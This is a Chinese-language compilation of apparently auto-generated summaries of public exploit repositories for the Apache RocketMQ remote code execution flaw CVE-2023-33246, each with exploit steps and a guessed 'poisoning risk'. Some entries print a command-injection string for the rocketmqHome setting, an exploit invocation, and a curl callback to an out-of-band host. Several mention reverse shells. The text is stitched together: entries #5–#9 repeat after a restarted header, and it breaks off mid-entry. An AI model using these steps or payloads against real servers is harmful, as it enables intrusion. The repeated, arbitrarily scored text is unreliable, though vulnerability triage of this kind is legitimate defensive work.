2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
